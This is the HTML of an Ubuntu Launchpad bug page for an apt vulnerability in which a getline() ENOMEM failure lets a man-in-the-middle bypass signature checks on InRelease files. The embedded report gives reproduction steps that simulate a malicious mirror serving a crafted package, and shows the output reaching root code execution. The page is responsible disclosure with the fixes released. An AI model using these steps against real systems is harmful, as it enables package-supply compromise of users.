    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/apt/+bug/1647467/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787766/+files/0001-Correctly-check-getline-errors.patch">0001-Correctly-check-getline-errors.patch</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787766">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787977/+files/0001-gpgv-Check-for-errors-during-reading-esp.-getline.patch">0001-gpgv-Check-for-errors-during-reading-esp.-getline.patch</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787977">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788153/+files/apt_1.0.1ubuntu2.16.diff">proposed debdiff for trusty</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788153">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788165/+files/apt_1.2.15ubuntu0.1.diff">proposed debdiff for xenial security</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788165">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788168/+files/apt_1.3.2.diff">proposed debdiff for yakkety</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788168">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789063/+files/apt_1.0.1ubuntu2.16.diff">updated trusty diff</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789063">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789064/+files/apt_1.2.15ubuntu0.1.diff">updated xenial-security debdiff</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789064">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789065/+files/apt_1.3.2.diff">updated yakkety-security debdiff</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789065">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/apt/+bug/1647467/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787978/+files/0002-gpgv-Flush-the-files-before-checking-for-errors.patch">0002-gpgv-Flush-the-files-before-checking-for-errors.patch</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787978">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788102/+files/apt_sig_bypass.tar">Reproducer helper</a>
        <small>
          (<a href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788102">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/apt/+bug/1647467/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"bug_is_private": false, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1647467", "web_link": "https://bugs.launchpad.net/bugs/1647467", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1647467, "private": false, "information_type": "Public Security", "name": null, "title": "InRelease file splitter treats getline() errors as EOF", "description": "We have just been made aware of a security bug upstream that affects the validation of signatures on InRelease file. This bug is to track progress for it.\n\nIt allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.\n\nIt works by making a call to getline() fail with ENOMEM, which is not documented as an error for that but follows from the fact that getline() can allocate memory. In such a case, apt would treat the first part of the file as a valid release file.\n\n\n= Original bug report =\nFrom: Jann Horn \u003cemail address hidden\u003e\nTo: \u003cemail address hidden\u003e\nCc: \nDate: Mon, 5 Dec 2016 18:33:09 +0100\nSubject: apt: repository signing bypass via memory allocation failure\n\n== Vulnerability ==\nWhen apt-get updates a repository that uses an InRelease file (clearsigned\nRelease files), this file is processed as follows:\nFirst, the InRelease file is downloaded to disk.\nIn a subprocess running the gpgv helper, \"apt-key verify\" (with some more\narguments) is executed through the following callchain:\n\ngpgv.cc:main -\u003e pkgAcqMethod::Run -\u003e GPGVMethod::URIAcquire\n\u00a0\u00a0-\u003e GPGVMethod::VerifyGetSigners -\u003e ExecGPGV\n\nExecGPGV() splits the clearsigned file into payload and signature using\nSplitClearSignedFile(), calls apt-key on these two files to perform the\ncryptographic signature verification, then discards the split files and only\nretains the clearsigned original. SplitClearSignedFile() ignores leading and\ntrailing garbage.\n\nAfterwards, in the parent process, the InRelease file has to be loaded again\nso that its payload can be processed. At this point, the code\nisn't aware anymore whether the Release file was clearsigned or\nsplit-signed, so the file is opened using OpenMaybeClearSignedFile(), which\nfirst attempts to parse the file as a clearsigned (InRelease) file and extract\nthe payload, then falls back to treating the file as the file as a split-signed\n(Release) file if the file format couldn't be recognized.\n\nThe weakness here is: If an attacker can create an InRelease file that\nis parsed as a proper split-signed file during signature validation, but then\nisn't recognized by OpenMaybeClearSignedFile(), the \"leading garbage\" that was\nignored by the signature validation is interpreted as repository metadata,\nbypassing the signing scheme.\n\nIt first looks as if it would be impossible to create a file that is recognized\nas split-signed by ExecGPGV(), but isn't recognized by\nOpenMaybeClearSignedFile(), because both use the same function,\nSplitClearSignedFile(), for parsing the file. However, multiple executions of\nSplitClearSignedFile() on the same data can actually have different non-error\nresults because of a bug.\nSplitClearSignedFile() uses getline() to parse the input file. A return code\nof -1, which signals that either EOF or an error occured, is always treated\nas EOF. The Linux manpage only lists EINVAL (caused by bad arguments) as\npossible error code, but because the function allocates (nearly) unbounded\namounts of memory, it can actually also fail with ENOMEM if it runs out of\nmemory.\nTherefore, if an attacker can cause the address space in the main apt-get\nprocess to be sufficiently constrained to prevent allocation of a large line\nbuffer while the address space of the gpgv helper process is less constrained\nand permits the allocation of a buffer with the same size, the attacker can use\nthis to fake an end-of-file condition in SplitClearSignedFile() that causes the\nfile to be parsed as a normal Release file.\n\nA very crude way to cause such a constraint on a 32-bit machine is based on\nabusing ASLR. Because ASLR randomizes the address space after each execve(),\nthereby altering how much contiguous virtual memory is available, an allocation\nthat attempts to use the average available virtual memory should ideally succeed\n50% of the time, resulting in an upper limit of 25% for the success rate of the\nwhole attack. (That's not very effective, and a real attacker would likely want\na much higher success rate, but it works for a proof of concept.)\nThis is not necessarily a limitation of the vulnerability, just a limitation\nof the way the exploit is designed.\n\nI think that it would make sense to fix this as follows:\n\u00a0- Set errno to 0 before calling getline(), verify that it's still 0 after\n\u00a0\u00a0\u00a0returning -1, treat it as an error if errno isn't 0 anymore.\n\u00a0- Consider splitting the InRelease file only once, before signature validation,\n\u00a0\u00a0\u00a0and then deleting the original clearsigned file instead of the payload file.\n\u00a0\u00a0\u00a0This would get rid of the weakness that the file is parsed twice and parsing\n\u00a0\u00a0\u00a0differences can have security consequences, which is a pretty brittle design.\n\u00a0- I'm not sure whether this bug would have been exploitable if the parser for\n\u00a0\u00a0\u00a0split files or the parser for Release files had been stricter. You might want\n\u00a0\u00a0\u00a0to consider whether you could harden this code that way.\n\n== Reproduction instructions ==\nThese steps are probably more detailed than necessary.\n\nFirst, prepare a clean Debian VM for the victim:\n\n\u00a0- download debian-8.6.0-i386-netinst.iso (it is important that this\n\u00a0\u00a0\u00a0is i386 and not amd64)\n\u00a0- install Virtualbox (I'm using version 4.6.36 from Ubuntu)\n\u00a0- create a new VM with the following properties:\n\u00a0\u00a0- type \"Linux\", version \"Debian (32-bit)\"\n\u00a0\u00a0- 8192 MB RAM (this probably doesn't matter much, especially\n\u00a0\u00a0\u00a0\u00a0if you enable swap)\n\u00a0\u00a0- create a new virtual harddrive, size 20GB (also doesn't matter much)\n\u00a0- launch the VM, insert the CD\n\u00a0- pick graphical install\n\u00a0- in the installer, use defaults everywhere, apart from enabling Xfce\n\u00a0\u00a0\u00a0in the software selection\n\nAfter installation has finished, log in, launch a terminal,\n\"sudo nano /etc/apt/sources.list\", change the \"deb\" line for jessie-updates\nso that it points to some unused port on the host machine instead of\nthe proper mirror\n(\"deb http://192.168.0.2:1337/debian/ jessie-updates main\" or so).\nThis simulates a MITM attack or compromised mirror.\n\nOn the host (as the attacker):\n\n$ tar xvf apt_sig_bypass.tar\napt_sig_bypass/\napt_sig_bypass/debian/\napt_sig_bypass/debian/netcat-evil.deb\napt_sig_bypass/debian/dists/\napt_sig_bypass/debian/dists/jessie-updates/\napt_sig_bypass/debian/dists/jessie-updates/InRelease.part1\napt_sig_bypass/debian/dists/jessie-updates/main/\napt_sig_bypass/debian/dists/jessie-updates/main/binary-i386/\napt_sig_bypass/debian/dists/jessie-updates/main/binary-i386/Packages\napt_sig_bypass/make_inrelease.py\n$ cd apt_sig_bypass/\n$ curl --output debian/dists/jessie-updates/InRelease.part2\nhttp://ftp.us.debian.org/debian/dists/jessie-updates/InRelease\n\u00a0\u00a0% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Dload  Upload   Total   Spent    Left  Speed\n100  141k  100  141k    0     0   243k      0 --:--:-- --:--:-- --:--:--  243k\n$ ./make_inrelease.py\n$ ls -lh debian/dists/jessie-updates/InRelease\n-rw-r--r-- 1 user user 1.3G Dec  5 17:13 debian/dists/jessie-updates/InRelease\n$ python -m SimpleHTTPServer 1337 .\nServing HTTP on 0.0.0.0 port 1337 ...\n\nNow, in the VM, as root, run \"apt-get update\".\nIt will probably fail - run it again until it doesn't fail anymore.\nThe errors that can occur are \"Clearsigned file isn't valid\" (when the\nallocation during gpg verification fails) and some message about\na hash mismatch (when both allocations succeed). After \"apt-get update\"\nhas succeeded, run \"apt-get upgrade\" and confirm the upgrade. The result should\nlook like this (server IP censored, irrelevant output removed and marked with\n\"[...]\"):\n\nroot@debian:/home/user# apt-get update\nGet:1 http://{{{SERVERIP}}}:1337 jessie-updates InRelease [1,342 MB]\n[...]\nHit http://ftp.us.debian.org jessie-updates InRelease\n[...]\n100% [1 InRelease gpgv 1,342 MB]\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a028.6 MB/s 0sSplitting up\n/var/lib/apt/lists/partial/{{{SERVERIP}}}:1337_debian_dists_jessie-updates_InRelease\nintIgn http://{{{SERVERIP}}}:1337 jessie-updates InRelease\nE: GPG error: http://{{{SERVERIP}}}:1337 jessie-updates InRelease:\nClearsigned file isn't valid, got 'NODATA' (does the network require\nauthentication?)\n\nroot@debian:/home/user# apt-get update\n[...]\nGet:1 http://{{{SERVERIP}}}:1337 jessie-updates InRelease [1,342 MB]\n[...]\nHit http://ftp.us.debian.org jessie-updates InRelease\nGet:4 http://{{{SERVERIP}}}:1337 jessie-updates/main i386 Packages [170 B]\n[...]\nFetched 1,349 MB in 55s (24.4 MB/s)\nReading package lists... Done\n\nroot@debian:/home/user# apt-get upgrade\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nCalculating upgrade... Done\nThe following packages will be upgraded:\n\u00a0\u00a0netcat-traditional\n1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 666 B of archives.\nAfter this operation, 109 kB disk space will be freed.\nDo you want to continue? [Y/n]\nGet:1 http://{{{SERVERIP}}}:1337/debian/ jessie-updates/main\nnetcat-traditional i386 9000 [666 B]\nFetched 666 B in 0s (0 B/s)\nReading changelogs... Done\ndpkg: warning: parsing file '/var/lib/dpkg/tmp.ci/control' near line 5\npackage 'netcat-traditional':\n\u00a0missing description\ndpkg: warning: parsing file '/var/lib/dpkg/tmp.ci/control' near line 5\npackage 'netcat-traditional':\n\u00a0missing maintainer\n(Reading database ... 86469 files and directories currently installed.)\nPreparing to unpack .../netcat-traditional_9000_i386.deb ...\narbitrary code execution reached\nuid=0(root) gid=0(root) groups=0(root)\n[...]\n\nAs you can see, if the attacker gets lucky with the ASLR randomization, there\nare no security warnings and \"apt-get upgrade\" simply installs the malicious\nversion of the package. (The dpkg warnings are just because I created a minimal\npackage file, without some of the usual information.)\n\nThis bug is subject to a 90 day disclosure deadline. If 90 days elapse\nwithout a broadly available patch, then the bug report will automatically\nbecome visible to the public.", "owner_link": "https://bugs.launchpad.net/api/devel/~juliank", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/bug_tasks", "duplicate_of_link": null, "date_created": "2016-12-05T20:36:48.710689+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/subscriptions", "date_last_updated": "2019-01-29T23:42:55.835857+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 272, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/attachments", "security_related": true, "latest_patch_uploaded": "2016-12-08T15:09:37.189954+00:00", "tags": ["patch", "verification-done"], "date_last_message": "2019-01-29T23:42:55.292172+00:00", "number_of_duplicates": 0, "message_count": 32, "users_affected_count": 3, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/users_unaffected", "users_affected_count_with_dupes": 3, "other_users_affected_count_with_dupes": 3, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1647467/linked_merge_proposals", "http_etag": "\"aa44a6e0ef79e692dc358aa9f692b498977dfe49-5d3072f0d34c06722d56b1486f0460900127c809\""}, "total_comments_and_activity": 87, "related_features": {}, "information_type_data": {"PUBLIC": {"is_private": false, "name": "Public", "order": 0, "description": "Everyone can see this information.\n", "value": "PUBLIC", "description_css_class": "choice-description"}, "PRIVATESECURITY": {"is_private": true, "name": "Private Security", "order": 2, "description": "Only the security group can see this information.\n ", "value": "PRIVATESECURITY", "description_css_class": "choice-description"}, "PUBLICSECURITY": {"is_private": false, "name": "Public Security", "order": 1, "description": "Everyone can see this security related information.\n", "value": "PUBLICSECURITY", "description_css_class": "choice-description"}, "USERDATA": {"is_private": true, "name": "Private", "order": 3, "description": "Only shared with users permitted to see private user information.\n", "value": "USERDATA", "description_css_class": "choice-description"}}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apt/+bug/1647467", "web_link": "https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1647467", "milestone_link": null, "status": "Fix Released", "importance": "High", "assignee_link": "https://bugs.launchpad.net/api/devel/~juliank", "bug_target_display_name": "apt (Ubuntu)", "bug_target_name": "apt (Ubuntu)", "bug_watch_link": null, "date_assigned": "2016-12-05T22:19:38.210106+00:00", "date_created": "2016-12-05T20:36:48.710689+00:00", "date_confirmed": "2016-12-05T20:37:01.933783+00:00", "date_incomplete": null, "date_in_progress": "2016-12-05T22:19:38.209326+00:00", "date_closed": "2016-12-18T01:53:53.990671+00:00", "date_left_new": "2016-12-05T20:37:01.933783+00:00", "date_triaged": "2016-12-05T20:37:01.933783+00:00", "date_fix_committed": "2016-12-08T15:13:56.043054+00:00", "date_fix_released": "2016-12-18T01:53:53.990671+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~juliank", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apt", "title": "Bug #1647467 in apt (Ubuntu): \"InRelease file splitter treats getline() errors as EOF\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apt/+bug/1647467/related_tasks", "is_complete": true, "http_etag": "\"3aa5b447cc6e0a17121219f9122cb5b675a0117b-4fe9098d931ef2612e98c16282323c574d77441d\""}, "bugtask_data": {"2173840": {"delete_link": "https://bugs.launchpad.net/ubuntu/trusty/+source/apt/+bug/1647467/+delete", "bug_title": "InRelease file splitter treats getline() errors as EOF", "user_can_unassign": false, "importance_value": "Critical", "user_can_edit_importance": false, "assignee_vocabulary": "AllUserTeamsParticipation", "hide_assignee_team_selection": true, "user_can_edit_status": true, "user_can_delete": false, "row_id": "tasksummary2173840", "target_is_product": false, "user_can_edit_milestone": false, "prefix": "ubuntu_trusty_apt", "bugtask_path": "/ubuntu/trusty/+source/apt/+bug/1647467", "id": 2173840, "milestone_value": null, "status_widget_items": "[]", "milestone_widget_items": "[]", "form_row_id": "task2173840", "targetname": "apt (Ubuntu Trusty)", "assignee_is_team": null, "assignee_vocabulary_filters": [], "user_can_edit_assignee": false, "importance_widget_items": "[]", "assignee_value": null, "status_value": "Fix Released"}, "2173793": {"delete_link": "https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+delete", "bug_title": "InRelease file splitter treats getline() errors as EOF", "user_can_unassign": false, "importance_value": "High", "user_can_edit_importance": false, "assignee_vocabulary": "AllUserTeamsParticipation", "hide_assignee_team_selection": true, "user_can_edit_status": true, "user_can_delete": false, "row_id": "tasksummary2173793", "target_is_product": false, "user_can_edit_milestone": false, "prefix": "ubuntu_apt", "bugtask_path": "/ubuntu/+source/apt/+bug/1647467", "id": 2173793, "milestone_value": null, "status_widget_items": "[]", "milestone_widget_items": "[]", "form_row_id": "task2173793", "targetname": "apt (Ubuntu)", "assignee_is_team": false, "assignee_vocabulary_filters": [], "user_can_edit_assignee": false, "importance_widget_items": "[]", "assignee_value": "juliank", "status_value": "Fix Released"}, "2173844": {"delete_link": "https://bugs.launchpad.net/ubuntu/xenial/+source/apt/+bug/1647467/+delete", "bug_title": "InRelease file splitter treats getline() errors as EOF", "user_can_unassign": false, "importance_value": "High", "user_can_edit_importance": false, "assignee_vocabulary": "AllUserTeamsParticipation", "hide_assignee_team_selection": true, "user_can_edit_status": true, "user_can_delete": false, "row_id": "tasksummary2173844", "target_is_product": false, "user_can_edit_milestone": false, "prefix": "ubuntu_xenial_apt", "bugtask_path": "/ubuntu/xenial/+source/apt/+bug/1647467", "id": 2173844, "milestone_value": null, "status_widget_items": "[]", "milestone_widget_items": "[]", "form_row_id": "task2173844", "targetname": "apt (Ubuntu Xenial)", "assignee_is_team": null, "assignee_vocabulary_filters": [], "user_can_edit_assignee": false, "importance_widget_items": "[]", "assignee_value": null, "status_value": "Fix Released"}, "2173845": {"delete_link": "https://bugs.launchpad.net/ubuntu/zesty/+source/apt/+bug/1647467/+delete", "bug_title": "InRelease file splitter treats getline() errors as EOF", "user_can_unassign": false, "importance_value": "High", "user_can_edit_importance": false, "assignee_vocabulary": "AllUserTeamsParticipation", "hide_assignee_team_selection": true, "user_can_edit_status": true, "user_can_delete": false, "row_id": "tasksummary2173845", "target_is_product": false, "user_can_edit_milestone": false, "prefix": "ubuntu_zesty_apt", "bugtask_path": "/ubuntu/zesty/+source/apt/+bug/1647467", "id": 2173845, "milestone_value": null, "status_widget_items": "[]", "milestone_widget_items": "[]", "form_row_id": "task2173845", "targetname": "apt (Ubuntu Zesty)", "assignee_is_team": false, "assignee_vocabulary_filters": [], "user_can_edit_assignee": false, "importance_widget_items": "[]", "assignee_value": "juliank", "status_value": "Fix Released"}, "2173841": {"delete_link": "https://bugs.launchpad.net/ubuntu/yakkety/+source/apt/+bug/1647467/+delete", "bug_title": "InRelease file splitter treats getline() errors as EOF", "user_can_unassign": false, "importance_value": "High", "user_can_edit_importance": false, "assignee_vocabulary": "AllUserTeamsParticipation", "hide_assignee_team_selection": true, "user_can_edit_status": true, "user_can_delete": false, "row_id": "tasksummary2173841", "target_is_product": false, "user_can_edit_milestone": false, "prefix": "ubuntu_yakkety_apt", "bugtask_path": "/ubuntu/yakkety/+source/apt/+bug/1647467", "id": 2173841, "milestone_value": null, "status_widget_items": "[]", "milestone_widget_items": "[]", "form_row_id": "task2173841", "targetname": "apt (Ubuntu Yakkety)", "assignee_is_team": null, "assignee_vocabulary_filters": [], "user_can_edit_assignee": false, "importance_widget_items": "[]", "assignee_value": null, "status_value": "Fix Released"}}, "subscribers_portlet_url_data": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1647467", "web_link": "https://bugs.launchpad.net/bugs/1647467"}, "initial_comment_batch_offset": 41, "first visible_recent_comment": -9};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 68 queries/external actions issued in 1.18 seconds

    Features: {'app.maintenance_message': None, 'hard_timeout': '9000', 'js.yui_version': None, 'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'baselayout.careers_link.disabled': None, 'bugs.affected_count_includes_dupes.disabled': None, 'visible_render_time': None, 'profiling.enabled': None, 'bugs.nominations.bug_supervisors_can_target': 'on'}

    r0d8de2b

    -->

</html>

